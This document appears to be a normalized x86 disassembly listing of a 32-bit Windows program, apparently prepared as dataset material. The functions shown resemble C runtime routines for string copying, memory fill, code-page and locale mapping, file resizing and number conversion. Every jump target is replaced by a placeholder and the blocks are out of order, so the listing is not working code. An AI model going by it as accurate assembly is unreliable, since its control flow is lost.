push eax
call sub_40dffc
pop ecx
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne r-xdata
cmp ebx [ edi ]
jl r-xdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40dfe1
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_40e023
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40df55
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40e023
add esp 0x20
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_40e023
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_40dffc
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_40e023
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
sub_40e248
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40f1c9
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40e21c
add esp 0x24
leave
retn
sub_40e275
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40f1c9
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40e232
add esp 0x24
leave
retn
sub_40e2b0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40e2c0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40e3a0
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle r-xdata
and [ eax ] 0x0
test ebx ebx
jl r-xdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne r-xdata
cmp [ ecx ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp r-xdata
push edi
call sub_40db20
inc eax
push eax
push edi
push esi
call sub_408fa0
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
dec eax
cmp [ eax ] 0x39
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp r-xdata
sub_40e417
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40e47b
pop ecx
lea esi [ ebp - 0xc ]
pop ecx
push rw-data
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_40f69a
mov [ rw-data ] eax
add esp 0x18
movsx eax [ rw-data ]
mov [ rw-data ] eax
pop edi
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] rw-data
mov eax rw-data
pop esi
leave
retn
sub_40e47b
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
lea edi [ ecx + 0x3c00 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40e540
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_40e5b2
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_40e5e3
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_40e77c
mov esi eax
pop ecx
cmp esi [ rw-data ]
mov [ ebp + 0x8 ] esi
je r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40e7f9
xor edx edx
mov eax rw-data
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_40e7c6
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
pop ecx
mov edi rw-data
cmp [ ebp - 0x18 ] 0x1
mov [ rw-data ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_40e822
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push esi
call sub_40e7c6
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_40e77c
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_40e7c6
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40e7f9
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40e822
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40d9cd
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40edd9
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40edd9
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_40e9c3
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40ea4c
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je r-xdata
mov esi [ rw-data ]
mov eax rw-data
dec eax
dec eax
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_40eb79
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp r-xdata
sub eax 0x4
je r-xdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je r-xdata
push 0x3
call sub_40ac56
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov ebx [ rw-data ]
and [ rw-data ] 0x0
cmp edi ecx
jne r-xdata
cmp edi 0xb
je r-xdata
sub eax 0x4
je r-xdata
and [ eax ] 0x0
cmp edi ecx
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x8c
mov [ ebp + 0x8 ] edx
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
push edi
call esi
cmp edi 0xb
pop ecx
je r-xdata
push [ rw-data ]
push 0x8
call esi
pop ecx
pop ecx
jmp r-xdata
cmp edi ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
dec eax
je r-xdata
cmp edi 0x8
mov [ rw-data ] ebx
jne r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
cmp eax ecx
jge r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rw-data ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne r-xdata
jmp r-xdata
sub_40eb79
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40ebbe
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40a1e8
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebx
call sub_409a3d
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_40e540
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_40ec3b
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rw-data ] esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_408940
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_4083b0
mov eax [ rw-data ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_40ec93
push ebp
mov ebp esp
mov eax 0x1000
call sub_408e30
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ebx [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx * 8 + 0x4 ] 0x1
je r-xdata
push 0x1
push esi
push ebx
call sub_40b9e2
add esp 0xc
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
or eax 0xffffffff
push 0x2
push esi
push ebx
call sub_40b9e2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
push 0x1000
lea eax [ ebp - 0x1000 ]
push esi
push eax
call sub_40e540
push 0x8000
push ebx
call sub_40f92d
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_40b9e2
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push ebx
call sub_40b9e2
push ebx
call sub_40d55c
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi 0xffffffff
jne r-xdata
push eax
lea eax [ ebp - 0x1000 ]
push eax
push ebx
call sub_40b043
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
mov [ rw-data ] 0xd
call [ GetLastError@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
mov [ rw-data ] 0xd
push [ ebp + 0xc ]
push ebx
call sub_40f92d
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
mov eax 0x1000
cmp edi eax
jge r-xdata
sub_40edd9
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40effd
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push rw-data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_408e30
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_408e30
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40effd
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40f028
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb r-xdata
push 0x1
pop eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_40f049
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_40f028
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_40f028
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_40f028
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_40f028
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_40f0a7
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_40f0d5
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_40f102
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp r-xdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_40f0a7
push ebx
call sub_40f0a7
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40f049
push ebx
call sub_40f0a7
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40f049
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_40f0a7
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp r-xdata
test [ ebx + 0x8 ] esi
jne r-xdata
sub_40f1c9
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
